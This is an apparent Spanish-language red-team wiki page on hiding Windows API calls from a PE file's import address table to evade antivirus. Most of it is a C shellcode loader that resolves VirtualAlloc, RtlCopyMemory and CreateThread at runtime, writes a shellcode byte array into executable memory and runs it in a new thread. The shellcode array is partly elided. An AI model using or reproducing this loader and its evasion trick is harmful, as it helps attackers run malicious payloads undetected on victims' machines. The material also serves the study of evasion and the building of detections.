# Function call obfuscation

{% embed url="https://en.wikipedia.org/wiki/Portable_Executable" %}

Portable Executable representan multiples tipos de archivos en un sistema operativo, entre los más comunes están los **.exe** o **.dll**, (aunque también existen otros como acm, .ax, .cpl, .drv, .efi, .mui, .ocx, .scr, .sys, .tsp). Estos en su estructura cuentan con la llamada **IAT** (import address table), que es la encargada de llevar el registro de que funciones está llamando la aplicación a diferentes módulos.&#x20;

Los **AV** utilizan esta tabla para determinar si una aplicación es maliciosa si tiene las mismas llamadas a funciones externas que tendría un archivo malicioso, por lo que podemos obfuscar estas llamadas a funciones en tiempo de ejecución.



```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
void (WINAPI * pRtlCopyMemory)(void* Destination, const void* Source, size_t Length);
HANDLE (WINAPI * pCreateThread)(
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        SIZE_T dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        DWORD dwCreationFlags,
        LPDWORD lpThreadId
    );
    
void main()
{
    unsigned char shellcode[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                             ...
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
    
    pVirtualAlloc = (void* (*)(void*, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
    pRtlCopyMemory = (void (WINAPI *)(void*, const void*, size_t))GetProcAddress(GetModuleHandle("NtDll.dll"), "RtlCopyMemory");
    pCreateThread = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateThread");
    PVOID shellcode_exec = pVirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    pRtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
    DWORD threadID;
    HANDLE hThread = pCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    WaitForSingleObject(hThread, INFINITE);
}

```





Al analizar la IAT de un proceso sin obfuscar las funciones se verían algo así

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption><p>kernel32.dll funcions</p></figcaption></figure>

En cambio al obfuscar las funciones ya no se ven más en la IAT:

<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption><p>kernel32.dll functions</p></figcaption></figure>
